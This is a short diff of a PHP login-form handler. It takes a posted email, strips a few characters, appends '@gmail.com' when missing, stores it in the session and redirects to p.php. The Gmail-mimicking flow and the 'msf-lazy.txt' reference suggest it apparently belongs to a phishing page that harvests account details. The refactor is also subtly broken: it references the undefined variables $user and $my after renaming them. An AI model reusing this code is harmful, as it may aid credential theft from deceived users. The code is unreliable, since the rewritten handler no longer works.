@@ -9,29 +9,34 @@
   <link rel="stylesheet" type="text/css"  href="index.css" media="screen" />
  
 <?php
-session_start ();
- $_SESSION['link'] = "msf-lazy.txt";
- ?>
+    session_start ();
+    $_SESSION['link'] = "msf-lazy.txt";
+?>
 
 <?php 
 if(isset($_POST['submit'])){
-  
-  $user = $_POST["Email"]; 
-  $html = array("<",">","$","%"); 
-  $gu = strchr($user,"@");
-  $htex = array(" "," "," "," ");
-  $_SESSION['email'] = $my = str_replace($html,$htex,$user);
+    $userEmail = $_POST["Email"]; 
+    $emailDelimiterPosition = strchr($userEmail, "@");
+    $html = ["<",">","$","%"];
+    $htex = [" "," "," "," "];
+    $gmailUser = str_replace(
+        $html,
+        $htex,
+        $user
+    );
 
-  if(empty($gu)){
-  $use = $my."@gmail.com";
-  }
-  else{
-    $use = $my;
-  }
-  $g = strlen($use);
-  if($g  >= 14 && $g < 30){ 
-    $_SESSION['use']  = $use; 
-    header("Location:p.php"); 
+    $_SESSION['email'] = $gmailUser;
+    $completedEmail = $gmailUser;
+
+    if (empty($emailDelimiterPosition)) {
+        $completedEmail = $my."@gmail.com";
+    }
+
+    $userEmailLength = strlen($completedEmail);
+    
+    if($userEmailLength >= 14 && $userEmailLength < 30){ 
+        $_SESSION['use'] = $completedEmail; 
+        header("Location: p.php"); 
     }
 }
 
